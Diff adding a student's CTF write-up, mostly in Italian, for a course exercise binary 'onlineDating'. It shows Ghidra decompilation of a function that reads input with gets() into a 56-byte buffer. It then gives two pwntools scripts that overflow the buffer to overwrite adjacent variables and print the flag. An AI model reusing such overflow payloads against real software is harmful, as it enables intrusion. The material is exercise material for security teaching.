@@ -1,0 +1,88 @@
+Istruzioni:
+What about updating your profile information?
+
+Do not patch this binary.
+Do not modify or delete the flag.txt file.
+You MUST solve the challenge by providing valid inputs.
+You CANNOT just jump with the debugger to any function that directly prints the flag.
+If you think you're breaking these rules with your solution, please ask the teachers.
+
+In ghidra vedo questo in una funzione: 
+
+undefined4 check_profile_info(void)
+
+{
+  int iVar1;
+  char local_68 [56];
+  undefined8 local_30;
+  undefined4 local_28;
+  undefined8 local_24;
+  undefined8 local_1c;
+  undefined8 local_14;
+  undefined4 local_c;
+  
+  puts(
+      "Dear User, this is the data shown on your online dating Tinker Profile. We believe it is outd ated...\n===================\nA recap of your data:"
+      );
+  local_14 = 0x30353778656c6f52;
+  local_1c = 0x2169726172726546;
+  local_24 = 0x216172696b616853;
+  local_30 = 0x505f647261726547;
+  local_28 = 0x65757169;
+  setvbuf(stdout,(char *)0x0,2,0);
+  printf("Name: %.12s\n",&local_30);
+  printf("Favourite Singer: %.8s\n",&local_24);
+  printf("Favourite Car: %.8s\n",&local_1c);
+  printf("Favourite Watch: %.8s\n",&local_14);
+  puts("===================");
+  puts("Please tell us how to update it (max 50 char):");
+  gets(local_68);
+  local_c = 1;
+  iVar1 = memcmp(&local_30,"Gerard_Pique",0xc);
+  if (iVar1 == 0) {
+    iVar1 = memcmp(&local_24,"Clara_C.",8);
+    if (iVar1 == 0) {
+      iVar1 = memcmp(&local_1c,"TwingoOo",8);
+      if ((iVar1 == 0) && (iVar1 = memcmp(&local_14,"CasioOo!",8), iVar1 == 0)) {
+        return local_c;
+      }
+      local_c = 0;
+    }
+    else {
+      local_c = 0;
+    }
+  }
+  else {
+    local_c = 2;
+  }
+  return local_c;
+}
+
+SOLUZIONE:
+vedo che c'è un buffer dichiarato di 56 caratteri, creo un payload :
+
+from pwn import *
+
+elf = ELF('./onlineDating')
+print(elf.symbols)
+
+with process('./onlineDating') as p:
+    print(p.recv())
+    payload = b'A'*56 + b'Gerard_PiqueClara_C.TwingoOoCasioOo!'
+    p.sendline(payload)
+    print(p.recv())
+
+
+UN ALTRA SOLUZIONE:
+from pwn import *
+
+payload = cyclic(56) + b'Gerard_Pique' + b'Clara_C.' + b'TwingoOo' + b'CasioOo!'
+
+# r = gdb.debug('./onlineDating')
+r = process('./onlineDating')
+r.sendlineafter(b'Please tell us how to update it (max 50 char):', payload)
+r.interactive()
+
+
+
+Nel terminale scrivo python3 <nomefilepython> e ho la flag in stampa
